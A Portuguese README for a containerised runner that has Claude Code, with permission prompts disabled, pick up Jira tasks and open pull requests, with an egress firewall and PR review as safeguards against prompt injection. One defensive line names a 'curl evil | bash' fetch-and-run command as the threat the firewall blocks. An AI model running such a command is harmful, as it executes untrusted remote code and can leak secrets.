# Jira "Fazendo" → PR (runner isolado)

Roda o workflow `/jira-pickup-ci` num **container Docker isolado**, em loop. A cada
`RUN_INTERVAL` segundos ele pega a próxima task em **Fazendo** no projeto POOL,
implementa numa branch e abre um PR pra revisão — sem nunca dar merge.

## Por que container

O agente é dirigido pela descrição da task no Jira (input não-confiável → risco de
prompt injection). Dentro do container o Claude roda com `--dangerously-skip-permissions`
(zero prompts, autonomia total), mas:

- **Isolamento de FS/processo:** dano fica preso no container; o host só expõe o repo montado.
- **Firewall de egress** (`init-firewall.sh`): saída bloqueada por padrão, liberada só pra
  Anthropic, GitHub, Atlassian, OpenRouter e os registries de pacote. Um `curl evil | bash`
  não tem pra onde mandar dado.
- **Gate de PR:** o pior caso é um PR ruim que você fecha — nada entra na `main` sem você.

## Setup (uma vez)

1. **Secrets:**
   ```bash
   cd automation
   cp .env.automation.example .env.automation
   ```
   Preencha em `.env.automation`:
   - `CLAUDE_CODE_OAUTH_TOKEN` — rode `claude setup-token` no host e cole. (ou `ANTHROPIC_API_KEY`)
   - `GH_TOKEN` — PAT fine-grained com **Contents** + **Pull requests: write** no repo.
   - `JIRA_API_TOKEN` — crie em https://id.atlassian.com/manage-profile/security/api-tokens
   - `OPENROUTER_API_KEY` — o mesmo do `.env` do projeto.

2. **Remote do GitHub** (obrigatório pra abrir PR — o repo ainda não tem):
   ```bash
   gh repo create pool-ai --private --source=. --remote=origin --push
   ```
   Sem remote, o runner implementa a branch e comenta o aviso na task, sem abrir PR.

## Rodar

```bash
cd automation
docker compose up -d --build      # sobe o loop
docker compose logs -f            # acompanha as execuções
docker compose down               # para
```

Teste pontual de uma rodada só (sem esperar o intervalo):

```bash
docker compose run --rm jira-agent bash automation/run-pickup.sh
```

## Ajustes

- **Frequência:** `RUN_INTERVAL` no `docker-compose.yml` (segundos; 900 = 15 min).
- **Liberar outro host no firewall:** `EXTRA_ALLOWED_HOSTS=host1,host2` no `.env.automation`.
- **Debug do firewall:** `FIREWALL=0` (NÃO use em operação normal).
- **Lógica do workflow:** edite [`.claude/commands/jira-pickup-ci.md`](../.claude/commands/jira-pickup-ci.md)
  (helper Jira REST: [`jira.sh`](jira.sh)). Mudanças aplicam na próxima rodada — sem rebuild.

## Limites conhecidos

- Roda só com o container de pé (`restart: unless-stopped` reinicia após reboot se o Docker subir no boot).
- O firewall resolve os IPs dos hosts no start; se um provedor trocar de faixa de IP no meio,
  reinicie o container (`docker compose restart`).
- `jira.sh doing` usa o endpoint `/rest/api/3/search/jql`. **Valide na primeira rodada** (ver abaixo).

## Primeiro teste recomendado

Antes de confiar no loop, valide o caminho do Jira fora do container:

```bash
cd automation && set -a && . .env.automation && set +a
bash jira.sh doing | jq '.issues[] | {key, summary: .fields.summary}'
```

Se isso listar suas tasks em "Fazendo", o resto do pipeline funciona. Depois suba o compose.
